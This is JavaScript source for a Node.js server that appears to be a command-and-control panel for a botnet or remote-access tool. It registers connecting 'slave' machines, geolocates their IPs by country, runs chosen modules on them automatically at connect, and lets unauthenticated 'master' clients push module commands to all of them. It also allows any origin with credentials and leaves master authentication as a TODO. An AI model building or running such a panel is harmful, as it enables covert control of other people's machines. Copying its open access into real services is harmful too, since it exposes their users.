let express = require("express");
let app = express();
let path = require("path");
let http = require("http").Server(app);
let socketio = require("socket.io");
let request = require("request");
let nodeCleanup = require("node-cleanup");
let fs = require("fs");
let pug = require("pug");

const debug = true;

let Modules = require("./Modules.js");

let ver = "";

try {
	ver = require("./../../version.js");
} catch (ex) {
	ver = "{UNKNOWN VERSION}";
}

let slaveSockets = [];
let slaveGeo = {};
let slaveCountries = [];

let modulesSettings = {
	onConnectModules: []
};

let serverSettings = {
	port: 8080
};

const CORS = "*";

let io = socketio(http, {origins: CORS});

let control_panel_html_path = path.join(__dirname, "control_panel");

app.set("view engine", "pug");
app.set("views", control_panel_html_path);
app.use(express.static(control_panel_html_path));

// Add headers
app.use(function (req, res, next) {

    // Website you wish to allow to connect
    res.setHeader('Access-Control-Allow-Origin', CORS);

    // Request methods you wish to allow
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, PATCH, DELETE');

    // Request headers you wish to allow
    res.setHeader('Access-Control-Allow-Headers', 'X-Requested-With,content-type');

    // Set to true if you need the website to include cookies in the requests sent
    // to the API (e.g. in case you use sessions)
    res.setHeader('Access-Control-Allow-Credentials', true);

    // Pass to next layer of middleware
    next();
});

app.get("/", function(req, res) {
	res.render("index", { version: ver });
});

app.get("/clients", function(req, res) {
	res.render("clients");
});

Modules.getAllModules().forEach(module => {
	if (module.widgetPath) {
		app.use("/"+module.name, express.static(path.parse(module.widgetPath).dir));
	}
});

app.get("/modules", function(req, res) {
	let renderedWidgets = [];

	Modules.getAllModules().forEach(module => {
		module.widgetPaths.forEach(path => {
			renderedWidgets.push(pug.renderFile(path, {
				basedir: control_panel_html_path,
				module: module
			}));
		});
	});
	
	res.render("modules", {
		autoRunListModules: Modules.getAllModules().filter(module => module.isAutoRun),
		onConnectModules: modulesSettings.onConnectModules,
		modules: Modules.getAllModules(),
		renderedWidgets: renderedWidgets
	});
});

io.on("connection", function(socket) {
	let ip = (socket.handshake.headers["x-forwarded-for"] || socket.request.connection.remoteAddress).address || "localhost";

	socket.emit("connection");

	socket.debugExecFunc = debug;
	
	socket.on("disconnect", function() {
		if (socket.mode == "slave" && slaveSockets.indexOf(socket) != -1) {
			slaveSockets.pop(socket);

			slaveGeo[socket.country].pop(socket);

			if (slaveGeo[socket.country].length == 0)
				slaveCountries.pop(socket.country);
				
			console.log("slave disconnected");
		} else {
			console.log("master disconnected");
		}
	});
	
	//TODO: Crypto validation on master connection
	socket.on("postConnection", function(mode) {
		if (mode === "slave") {
			slaveSockets.push(socket);
								
			request("http://www.geoplugin.net/json.gp?ip="+ip, function (error, response, body) {
				let json = JSON.parse(body);

				if (slaveGeo[json["geoplugin_countryName"]] == null) 
					slaveGeo[json["geoplugin_countryName"]] = [];
					
				slaveGeo[json["geoplugin_countryName"]].push(ip);

				socket.country = json["geoplugin_countryName"];

				if (slaveCountries.indexOf(socket.country) == -1)
					slaveCountries.push(socket.country);
			});
			console.log("new slave connection from: "+ ip);

			modulesSettings.onConnectModules.forEach(function(name) {
				Modules.getModule(name).exec(socket);
			});
		} else if (mode === "master") {
			socket.on("updateClientData", function() {
				
				let data = [];
				
				for (let i = 0; i < slaveCountries.length; i++) {
					data[i] = [slaveCountries[i], slaveGeo[slaveCountries[i]].length];
				}
				
				socket.emit("getClientsData", data, slaveGeo);
			});

			socket.on("updateModuleSettings", function(data) {
				modulesSettings = data;
				saveSettings();
				console.log(data);
			});

			socket.on("shutdown", function() {
				if (ip === "localhost") {
					process.exit();
				}
			});

			Modules.getAllModules().forEach(module => {
				module.controlPanelEvents.forEach(event => {
					socket.on(event.name, data => {
						event.function(data, socket, slaveSockets);
						console.log("ress");
					});
				});
			});

			console.log("new master connection from: "+ ip);
		}
		socket.mode = mode;
	});
	
});

function onShutdown(exitCode, signal) {
	console.log("Shutdown!");
	saveSettings();
}

function saveSettings() {

	let modulesSettingsJson = JSON.stringify(modulesSettings, null, "\t");
	fs.writeFile("modulesSettings.json", modulesSettingsJson, function() {

		let serverSettingsJson = JSON.stringify(serverSettings, null, "\t");
		fs.writeFileSync("serverSettings.json", serverSettingsJson);

	});
	
}

function loadSettings(callback) {
	fs.exists("modulesSettings.json", function(exists) {
		if (exists) {
			fs.readFile("modulesSettings.json", function(err, data) {
				console.log(data);
				modulesSettings = JSON.parse(data);
				console.log(modulesSettings);
			});
		}
	});
	fs.exists("serverSettings.json", function(exists) {
		fs.readFile("serverSettings.json", function(err, data) {
			if (!err) {
				serverSettings = JSON.parse(data);
			}
		});
	});

	saveSettings();
	if (callback) callback();
}

loadSettings(function() {

	http.listen(serverSettings.port, function() {
		console.log("listening on *:"+serverSettings.port);
		console.log("Control panel: http://localhost:"+serverSettings.port+"/");
	
		nodeCleanup(onShutdown);
	});

});
